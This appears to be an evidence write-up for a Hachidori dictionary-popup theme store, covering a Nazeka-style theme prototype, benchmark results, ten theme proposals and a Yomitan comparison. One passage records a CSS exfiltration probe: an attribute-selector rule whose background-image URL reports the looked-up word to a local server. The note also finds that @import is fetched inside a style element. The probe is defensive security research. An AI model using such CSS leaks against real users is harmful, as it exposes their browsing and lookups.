# Evidence

Everything the plan rests on. Section 1 is the original issue body's Evidence section, copied verbatim (the prototype, the benchmark and the CSS leak probes). Sections 2–5 add the ten theme proposals, the Yomitan check, the external checks and the code facts re-verified for this rewrite.

## 1. Original evidence (verbatim from the issue body before the rewrite)

Everything is on branch `evidence/issue-330-theme-store` under `docs/evidence/issue-330/theme-store/` (first round in the folder root; the JS prototype under `nazeka-js/`; the themes-repo schema, validator and lint config under `hachidori-themes-skeleton/`).

### 1.Nazeka (JS) prototype

`theme.yaml` + `theme.css` + `theme.js` (below) run by a worktree-only host in `content.js` ([`host-prototype.patch`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/host-prototype.patch), 230 lines; every file named here is under [`nazeka-js/`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js)): theme sheet at index 1, `import()` of the theme at content-script start, `onRender` after `bindResultActions` and `executeKanjiRequest`, `view.lookup`, per-call timings. Captured by `capture-nazeka-js.mjs` in Chrome for Testing 152.0.7977.75: fixture imported through Settings, a `Basic` note type against a fake AnkiConnect on `127.0.0.1:8765` (`test/anki-connect-fake.mjs`, the `chrome-e2e.mjs:5030-5068` handlers) so the Anki button exists, hover 食べたかった, click 食. Third column: **Nazeka itself** — `build_div`/`build_div_kanji` from wareya/nazeka `texthook.js` (`8b220fb`, default settings) extracted and rendered in the same Chrome by `nazeka-reference.mjs`; last row: Nazeka in Firefox, from its tutorial.

![Default vs Nazeka theme vs Nazeka itself: 食べたかった term view, 食 kanji view, and Nazeka's tutorial screenshot](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/nazeka-js-side-by-side.png)

**Fidelity** (every rule cites `texthook.js`; the `theme.css` header lists them): box `#111111`, 1 px `#CCCCCC` frame, 2 px padding, 2–3 px radii, no shadow, Arial 13 px, shrink-to-fit ≤ 600 px (:5-81, :219-221); right-floated looked-up row at 70 %, three characters of context, match bold in `#99DDFF` (:650-676, from the new `view.lookup`); `食べる《たべる》～-たい→-た #142 (食べる:たべる)` — 18 px `#99DDFF` keb, 15 px `#99FF99` reb, deconjugation chain, `#rank (keb:reb)` at 80 % (:592-641, :1052-1066); senses as one paragraph `(vt) (1) to eat; to live on (e.g. a salary); (col) (2) …` (:440-521); entries 3 px apart, no separators (:765); kanji mode `Currently in individual kanji mode. Press [Back] to cancel.`, `Grade: Kyouiku`, `Strokes: 9`, `Jouyou readings:`, `On'yomi: ショク、ジキ`, `Kun'yomi: く.う、た.べる` (:1188-1303). Measured (`evidence.json`): Nazeka term popup 463 × 135 (content-sized) vs default 560 × 420, `#111111`, headword `18px rgb(153, 221, 255)`, glosses `13px`, top bar `hidden`; kanji view 355 × 162. **Back on the headword row and nothing else:** the Anki and audio buttons, 24 px and borderless inside the looked-up row like Nazeka's own arrow/close icons (:676-716) — `+` and the speaker in the capture, `Mine to Anki` bound after the render lands in place; Note, custom and close buttons stay hidden; the kanji view keeps Back as the `[k]` stand-in. What the DOM cannot match: pos and misc tags are one list, so `(col)` precedes `(2)` where Nazeka prints `(2) (col)`; deinflection steps carry the engine's names (`-たい→-た`, Nazeka `want→past`); the kanji view adds a `Meanings:` line and has no composition data.

**Fault isolation** (`fault-isolation.mjs`, re-run on this host): a `theme.js` that hides the top bar and then throws leaves the popup rendered with the theme CSS, exactly one `console.warn`, later renders skip the hook — `popupRendered`, `cssStillApplied`, `exactlyOneWarning`, `hookSwitchedOff` all `true`. **Lint gate** (`hachidori-themes-skeleton/scripts/theme-js.eslint.config.mjs`, ESLint 9.39.1): this `theme.js` passes with 0 problems; the hostile module from round 2 still fails on 16 counts.

[`themes/nazeka/theme.yaml`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/theme.yaml) (palette keys elided; the `benchmark:` block is the run below):

```yaml
# themes/nazeka/theme.yaml — Hachidori theme manifest, schema 1
schema: 1
slug: nazeka
name: Nazeka
version: 1.1.0
author: bee-san
link: https://github.com/wareya/nazeka
description: Nazeka's popup as texthook.js draws it — #111111 box with a 1 px #cccccc frame, 18 px cyan headword with 《reading》, the looked-up sentence at the right, 13 px senses as "(pos) (1) gloss; gloss", kanji mode as plain lines. Only the audio and Anki buttons stay.
tags: [dark, compact, classic, nazeka]
license: GPL-3.0-or-later
minHachidoriVersion: 0.1.7
mode: dark
extends: default
palette:                 # 17 keys from wareya/nazeka texthook.js:31-35 — unchanged since round 2, see the full file
  base-100: "#111111"    # bgcolor … primary: "#99ddff" (hlcolor) … secondary: "#99ff99" (hlcolor2) …
css: theme.css
js:                      # bundled-only: shipped inside the Hachidori release, never fetched at runtime
  file: theme.js
  hooks: [onRender]
  summary: Rebuilds each entry as Nazeka's rows (looked-up text, 「headword」《reading》～deconjugation #frequency, compact senses; kanji mode lines), moves the audio and Anki buttons inline and hides the rest of the top bar.
options:                 # one-shot suggestions applied on activation, with Undo
  popupOpacityPercent: 100
  popupColumns: 1
screenshot: screenshot.png
preview:
  swatches: ["#111111", "#cccccc", "#99ddff", "#99ff99"]
benchmark:               # benchmark/hover-popup.mjs, this theme vs default, same Chrome and archives (see "How to benchmark a theme")
  harness: hover-popup.mjs
  harnessCommit: fc3eb73053be4851e68217de22cacd8e36a14935   # Hachidori commit the harness and reader came from
  chrome: 152.0.7977.75
  sessions: 5
  measuredAt: 2026-09-24
  onRenderP95Ms: 0.3     # 280 hook calls; budget 2
  onRenderMaxMs: 0.6
  hoverCompleteMedianMs: { default: 33.2, theme: 33.3 }   # 食べる, warm
  longEntryCompleteMedianMs: { default: 33.3, theme: 33.3 }   # 漢字 with 24 senses
  deepEntryCompleteMedianMs: { default: 33.3, theme: 33.3 }   # 深層, 40 nested elements
  kanjiOpenMedianMs: { default: 3.4, theme: 4.1 }          # click → kanji view in the DOM
  coldFirstMedianMs: { default: 38.5, theme: 41.1 }        # first hover of a fresh profile
  heapDeltaMiB: 0.33
  results: https://github.com/bee-san/hachidori/blob/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark/run2/summary.md
```

[`themes/nazeka/theme.js`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/theme.js) (170 lines, full file on the branch): `renderTerm` builds the looked-up row from `view.lookup`, `api.move`s the top bar's action group into it, then per entry `wordRow` moves the `.gsm-hoshidicts-expression` into a `span.nazeka-word`, appends `《reb》` (from the headword's `aria-label`, `popup.js:3214-3219`), `～step→step` from the deinflection steps and `#rank (keb:reb)` from `.gsm-hoshidicts-frequency-value`, and `api.hide`s metadata, tags, deinflection, compact summary and the secondary header; `renderKanji` writes Nazeka's lines from `.gsm-hoshidicts-kanji-stats dl` and the reading groups. Only `view`/`api` are touched; ESLint 0 problems.


[`themes/nazeka/theme.css`](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/theme.css) (330 lines, full file on the branch) opens with a map of every value to its `texthook.js` line, then the palette block generated from `theme.yaml`, the box, the looked-up row, the headword row, the inline senses (`li` as `display: inline` with `(n)` counters and the tags as `(…)` text) and the kanji lines.

### 1.Benchmark: Nazeka theme vs default

`benchmark/hover-popup.mjs` drives real pointer movement through the content script and records input → first correct frame, input → complete stable result, blank time, `Performance.getMetrics` deltas and long tasks per scan, over fresh Chrome profiles. Everything below is under [`nazeka-js/benchmark/`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/nazeka-js/benchmark) on the evidence branch. Two worktree-only additions (`harness-benchmark.patch`, 77 lines): `HACHIDORI_HOVER_OPTIONS` (JSON merged into the options the harness writes — `{"popupTheme":"nazeka"}` selects the theme exactly as Settings would) and, per scan, the host's `onRender` timings plus eight **kanji-view** opens (programmatic click on the 漢 link in the 漢字 popup → kanji entries in the DOM → next frame). Inputs, identical on both sides: the harness's fixture (食べる **short** flat entry; 深層 **deep**, gloss under 40 nested elements) plus `theme-bench-fixture.mjs` (漢字 with **24 numbered senses**, 233 popup nodes; a kanji bank for 漢/字). Same Chrome for Testing 152.0.7977.75 (`npm --prefix test/tooling run install:chrome`), same three archives, **5 fresh profiles per side**, back to back on one machine (load in each `manifest.json`); `run-benchmark.sh` ran it and logged every command with its output to `run2/commands.txt`; raw results `run2/{default,nazeka}/raw.json` (+ `manifest.json`, cold screenshots), `run2/summary.{json,md,yaml}` from `summarise.mjs`.

```text
$ node benchmark/hover-popup.mjs /tmp/theme-bench/run2/default hover-popup-fixture.zip theme-bench-senses.zip theme-bench-kanji.zip   → real 0m34.017s
$ HACHIDORI_HOVER_OPTIONS='{"popupTheme":"nazeka"}' node benchmark/hover-popup.mjs /tmp/theme-bench/run2/nazeka <same archives>   → real 0m32.993s
```
(`HACHIDORI_HOVER_SAMPLES=5`; Chrome and puppeteer-core from `test/tooling`; the fixture builds and the `summarise.mjs` call are in `commands.txt`.)

| Input | Measure (ms, median / p95) | Default | Nazeka (JS) | Δ median |
|---|---|---|---|---|
| short 食べる | hover → first correct frame | 16.8 / 17.0 | 16.8 / 16.9 | 0 |
|  | hover → complete result | 33.2 / 38.6 | 33.3 / 33.4 | +0.1 |
|  | layout · style recalc · script per scan; DOM nodes | 0.63 · 0.70 · 1.19; 32 | 0.37 · 0.56 · 1.07; 37 | −0.26 · −0.14 · −0.12; +5 |
| long 漢字 (24 senses) | hover → first correct frame | 17.1 / 56.3 | 17.0 / 51.4 | −0.1 |
|  | hover → complete result | 33.3 / 81.9 | 33.3 / 80.0 | 0 |
|  | layout · style recalc · script per scan; DOM nodes | 1.73 · 1.38 · 1.35; 228 | 1.55 · 1.62 · 1.22; 233 | −0.18 · +0.24 · −0.13; +5 |
| deep 深層 | hover → first correct frame | 16.9 / 85.6 | 16.8 / 85.3 | −0.1 |
|  | hover → complete result | 33.3 / 112.2 | 33.3 / 116.4 | 0 |
| kanji 漢 | click → kanji view in the DOM | 3.4 / 8.7 | 4.1 / 10.1 | +0.7 |
|  | click → next frame | 8.8 / 17.1 | 10.0 / 17.0 | +1.2 |
| cold (fresh profile) | first hover → first frame | 38.5 / 85.1 | 41.1 / 47.5 | +2.6 |
|  | first hover → complete | 54.1 / 89.9 | 49.9 / 50.9 | −4.2 |

`theme.js` **`onRender`** over all 280 calls: median 0.1 ms, **p95 0.3 ms**, max 0.6 ms (term 0.2 ms p95 for short, 24-sense and deep entries; kanji 0.5 ms). Reading-tab JS heap at session end: 4.27 MiB default vs 4.60 MiB Nazeka (**+0.33 MiB**). Against the harness's own rule (*"first/complete regression > 5 ms and 10% requires investigation"*): no input regresses; warm hover timings are frame-quantised (16.7 ms at 60 Hz) and identical on both sides, and the theme's per-scan layout/style work is at or below the default's (fewer laid-out nodes once tag rows, cards and metadata are hidden).

**What the first run found and fixed.** `run1-before-preload/` had the host start the theme fetch + `import()` at the first popup build: cold first frame 58.2 vs 38.5 ms (**+19.7**), cold complete 88.9 vs 54.6 ms (**+34.3**, p95 168 ms) — a cost every page paid once, while warm scans were unchanged. Loading the theme at content-script start (`adoptOptions` → `syncTheme()`, the CSS applied the moment the shadow root exists) brought the cold hover back to parity (run 2 above). Both runs' raw JSON are on the branch.

### 1.Earlier evidence (CSS drafts and the Custom-CSS leak)

Round 1 ([folder root](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-store/docs/evidence/issue-330/theme-store/)): Settings → Design today (`01-…png`), design-preview renders of the default palette and the CSS-only `nazeka`/`rikaikun` drafts (`02`–`04`, measurements in `evidence.json`); `rikaikun.theme.css` reproduces Rikaikun's `blue` theme (`melink14/rikaikun` `extension/css/popup.css:2-13`, :86-110 at `dd50b08`). **What unsanitised CSS in the popup's shadow root can do** (a constructed sheet appended like `popup.js:42-60`, a local server logging requests; `evidence.json` → `exfiltration`): `.gsm-hoshidicts-entry[data-expression^="食"] { background-image: url(http://127.0.0.1:…/leak) }` — **request received**, the `犬` probe did not fire, so a few hundred rules learn the looked-up word (`data-expression` is on every entry, `popup.js:3380`); `@import` in a constructed sheet — ignored; `@import` in a `<style>` element in the shadow root — **fetched and applied**; `@font-face` in the adopted sheet — no request (and `isSafeDictionaryStyle` rejects it). Existing suites on this checkout: `node --test` on the theme/options/template tests → 28 pass; `node test/make-fixture.mjs && node test/extension-smoke.mjs` → **631 passed, 0 failed**.

## 2. The ten theme proposals (comments 10–25)

At 18:24 UTC on 2026-09-28 bee-san moved each proposal to an issue in the themes repository ([`bee-san/hachidori-themes` issues #1–#10](https://github.com/bee-san/hachidori-themes/issues), to be renamed `hachidori-theme-store`). The comments in #334 now link to those issues. The screenshots and files below stay on the evidence branches.

Each proposal was built on the onRender prototype host (`host-prototype.patch`) and captured in the real popup in Chrome for Testing 152.0.7977.75. Its API gaps are summarised in [decisions.md](decisions.md) D9, D12, D13 and D16 and in the backlog cards. After c26/c28 each one becomes a renderer port (T-70–T-79), because their DOM scraping and hiding of Default is exactly what the renderer model removes.

### Kanji Atlas — `kanji-atlas` (T-70)

[comment 10](https://github.com/bee-san/hachidori/issues/334#issuecomment-5815804995) · evidence: [`evidence/issue-330-theme-kanji-atlas`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas)

![Default vs Kanji Atlas: 食べたかった](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas/side-by-side-term.png)
![Default vs Kanji Atlas: 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas/side-by-side-kanji.png)
![Default vs Kanji Atlas: 掛ける](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas/side-by-side-long.png)
![図書館 before, 書 card, after Back](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas/fills-in.png)
![勉強 before and after visiting 強](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas/fills-in-benkyou.png)
![hover, keyboard focus, drawer](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas/interaction-states.png)
![Bee's card with stroke diagram; forced colours](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-kanji-atlas/docs/evidence/issue-330/themes/kanji-atlas/kanji-cards.png)

### Learner Focus — `learner-focus` (T-71)

[comment 12](https://github.com/bee-san/hachidori/issues/334#issuecomment-5817632133) · [comment 14](https://github.com/bee-san/hachidori/issues/334#issuecomment-5817634699) · evidence: [`evidence/issue-330-theme-learner-focus`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus)

![Default vs Learner Focus: 食べたかった](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/side-by-side-term.png)
![Learner Focus layers 0–4 and the kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/layers.png)
![Known word: after Knew it, and on the next hover](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/known.png)
![Default vs Learner Focus: 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/side-by-side-kanji.png)
![掛ける, layer 1: 25 senses](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/lf-long-1-senses.png)
![図書館, layer 4: kanji table](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/lf-library-4-kanji.png)
![降り始めた, popup above the word](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/lf-above-word.png)
![静かに with definition blur](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-learner-focus/docs/evidence/issue-330/themes/learner-focus/lf-blur.png)

### Sentence Context (文脈) + night variant — `sentence-context` (T-72)

[comment 13](https://github.com/bee-san/hachidori/issues/334#issuecomment-5817632143) · evidence: [`evidence/issue-330-theme-sentence-context`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context)

![Default vs Sentence Context: 食べたかった](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context/side-by-side-term.png)
![Interaction states](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context/interaction-states.png)
![Default vs Sentence Context: 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context/side-by-side-kanji.png)
![Night variant over a texthooker page](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context/sc-dark-hooker-full.png)
![見つめていた, night variant](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context/sc-dark-long.png)
![Default vs Sentence Context on the texthooker page](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context/side-by-side-hooker.png)
![Keyboard focus ring on the tools row](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-sentence-context/docs/evidence/issue-330/themes/sentence-context/sc-term-focus.png)

### Tategaki (manga-vertical) + night variant — `manga-vertical` (T-73)

[comment 15](https://github.com/bee-san/hachidori/issues/334#issuecomment-5817966878) · evidence: [`evidence/issue-330-theme-manga-vertical`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical)

![Default vs Tategaki: 食べたかった on a mokuro-style page](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/side-by-side-term-page.png)
![Default vs Tategaki: the term view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/side-by-side-term.png)
![Default vs Tategaki: the 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/side-by-side-kanji.png)
![Default vs Tategaki: 掛ける](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/side-by-side-long.png)
![Tategaki: term, kanji-link hover, scrolled](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/states-term.png)
![Tategaki: focus ring, Note form, tab switched](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/states-controls.png)
![Tategaki: 読んでみよう, and without view.anchor](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/states-surface.png)
![Tategaki: left of the word; horizontal text](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/placements.png)
![Tategaki night: term and kanji](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-manga-vertical/docs/evidence/issue-330/themes/manga-vertical/night.png)

### Geocities Y2K — `geocities-y2k` (T-74)

[comment 16](https://github.com/bee-san/hachidori/issues/334#issuecomment-5821454752) · [comment 18](https://github.com/bee-san/hachidori/issues/334#issuecomment-5821461298) · evidence: [`evidence/issue-330-theme-geocities-y2k`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-geocities-y2k/docs/evidence/issue-330/themes/geocities-y2k)

![Default vs Geocities Y2K: 食べたかった term view and 食 kanji view, real popup](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-geocities-y2k/docs/evidence/issue-330/themes/geocities-y2k/y2k-overview.png)
![Geocities Y2K interaction states](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-geocities-y2k/docs/evidence/issue-330/themes/geocities-y2k/y2k-states.png)

### Retro Terminal — `retro-terminal` (T-75)

[comment 17](https://github.com/bee-san/hachidori/issues/334#issuecomment-5821458937) · evidence: [`evidence/issue-330-theme-retro-terminal`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-retro-terminal/docs/evidence/issue-330/themes/retro-terminal)

![Default vs Retro Terminal, 食べたかった term view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-retro-terminal/docs/evidence/issue-330/themes/retro-terminal/side-by-side-term.png)
![Row 1 selected, then after pressing j](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-retro-terminal/docs/evidence/issue-330/themes/retro-terminal/keyboard-states.png)
![Default vs Retro Terminal, 掛けたかった](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-retro-terminal/docs/evidence/issue-330/themes/retro-terminal/long-entry.png)
![Candidate list for 日本語, then after pressing 3](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-retro-terminal/docs/evidence/issue-330/themes/retro-terminal/candidate-list.png)
![Default vs Retro Terminal, 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-retro-terminal/docs/evidence/issue-330/themes/retro-terminal/side-by-side-kanji.png)
![Default vs Retro Terminal, 分 KANJIDIC kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-retro-terminal/docs/evidence/issue-330/themes/retro-terminal/kanji-real.png)

### Tango Pet LCD (tamagotchi-lcd) — `tamagotchi-lcd` (T-76)

[comment 19](https://github.com/bee-san/hachidori/issues/334#issuecomment-5822316614) · [comment 20](https://github.com/bee-san/hachidori/issues/334#issuecomment-5822319262) · evidence: [`evidence/issue-330-theme-tamagotchi-lcd`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-tamagotchi-lcd/docs/evidence/issue-330/themes/tamagotchi-lcd)

![Default vs Tango Pet LCD: 食べたかった term view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-tamagotchi-lcd/docs/evidence/issue-330/themes/tamagotchi-lcd/side-by-side-term.png)
![Default vs Tango Pet LCD: 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-tamagotchi-lcd/docs/evidence/issue-330/themes/tamagotchi-lcd/side-by-side-kanji.png)
![Before feeding, feeding, stage 2, sleepy](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-tamagotchi-lcd/docs/evidence/issue-330/themes/tamagotchi-lcd/states.png)
![Audio, no Anki, keyboard focus, reduced motion](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-tamagotchi-lcd/docs/evidence/issue-330/themes/tamagotchi-lcd/interaction.png)
![Pager: page 1, page 2, end of screen](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-tamagotchi-lcd/docs/evidence/issue-330/themes/tamagotchi-lcd/pager.png)
![Walk frames](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-tamagotchi-lcd/docs/evidence/issue-330/themes/tamagotchi-lcd/walk-frames.png)

### RPG Dialogue — `rpg-dialogue` (T-77)

[comment 21](https://github.com/bee-san/hachidori/issues/334#issuecomment-5825608102) · evidence: [`evidence/issue-330-theme-rpg-dialogue`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue)

![Default vs RPG Dialogue: 食べたかった](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/side-by-side-term.png)
![Pages 1, 2 and 3 of 食べる](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/pages.png)
![Command window with the hand cursor on きく](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/rpg-menu.png)
![Default vs RPG Dialogue: 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/side-by-side-kanji.png)
![KANJIDIC entry as page 2/2 with a JLPT pip bar and the ■ end marker](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/rpg-kanji-page2.png)
![上げる, page 1 of 6](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/rpg-long.png)
![Mid-typewriter frame](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/rpg-typing.png)
![Nested child popup for もっと inside the typed sentence](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/rpg-nested.png)
![Reduced motion: complete text, still cursor](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-rpg-dialogue/docs/evidence/issue-330/themes/rpg-dialogue/rpg-reduced-motion.png)

### Omikuji Shrine — `omikuji-shrine` (T-78)

[comment 22](https://github.com/bee-san/hachidori/issues/334#issuecomment-5825617147) · [comment 23](https://github.com/bee-san/hachidori/issues/334#issuecomment-5825619739) · evidence: [`evidence/issue-330-theme-omikuji-shrine`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-omikuji-shrine/docs/evidence/issue-330/themes/omikuji-shrine)

![Default vs Omikuji Shrine: 食べたかった](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-omikuji-shrine/docs/evidence/issue-330/themes/omikuji-shrine/side-by-side-term.png)
![Default vs Omikuji Shrine: 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-omikuji-shrine/docs/evidence/issue-330/themes/omikuji-shrine/side-by-side-kanji.png)
![Grades strip](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-omikuji-shrine/docs/evidence/issue-330/themes/omikuji-shrine/grades-strip.png)
![States strip](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-omikuji-shrine/docs/evidence/issue-330/themes/omikuji-shrine/states-strip.png)
![Entries strip](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-omikuji-shrine/docs/evidence/issue-330/themes/omikuji-shrine/entries-strip.png)

### 電子辞書 (denshi-jisho) — `denshi-jisho` (T-79)

[comment 24](https://github.com/bee-san/hachidori/issues/334#issuecomment-5827621889) · [comment 25](https://github.com/bee-san/hachidori/issues/334#issuecomment-5827623571) · evidence: [`evidence/issue-330-theme-denshi-jisho`](https://github.com/bee-san/hachidori/tree/evidence/issue-330-theme-denshi-jisho/docs/evidence/issue-330/themes/denshi-jisho)

![Default vs denshi-jisho: 食べたかった](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-denshi-jisho/docs/evidence/issue-330/themes/denshi-jisho/side-by-side-term.png)
![Keyboard flow: ArrowDown, Enter, 訳, ジャンプ](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-denshi-jisho/docs/evidence/issue-330/themes/denshi-jisho/keyboard-flow.png)
![Default vs denshi-jisho: 食 kanji view](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-denshi-jisho/docs/evidence/issue-330/themes/denshi-jisho/side-by-side-kanji.png)
![Menu screen and backlight off](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-denshi-jisho/docs/evidence/issue-330/themes/denshi-jisho/menu-backlight.png)
![Long entry: list, detail, scrolled](https://raw.githubusercontent.com/bee-san/hachidori/evidence/issue-330-theme-denshi-jisho/docs/evidence/issue-330/themes/denshi-jisho/long-entry.png)

## 3. Yomitan (checked for the "Yomitan theme" ask and for comparison)

Clone `yomidevs/yomitan` @ `67db60ddc2cbd7b5172d777c117e3201d7ddff0f` (2026-09-25):

- **Custom CSS.** The body cited `display.js:1312-1321` @ d34832d. The current code is `ext/js/display/display.js:1311-1322` `_getCustomCss()`: `general.customPopupCss`, then each enabled dictionary's `styles.css` wrapped by `addScopeToCss(css, '[data-dictionary="<title>"]')` (plain nesting, no parsing, `core/utilities.js:285-287`). `Display.setCustomCss` (544-556) puts everything in **one `<style>`** in the head of the popup iframe, after `material.css`, `display.css`, `display-pronunciation.css` and `structured-content.css`. `customPopupOuterCss` goes into the outer page (shadow root or `scripting.insertCSS`).
- **Themes.** `popupTheme` light | dark | browser | site (`app/theme-controller.js:133-138` sets `data-theme` and siblings). There is only light and dark; everything else is user CSS. The CSS editor is two textareas (`templates-modals.html:602-620`) with no presets or catalogue.
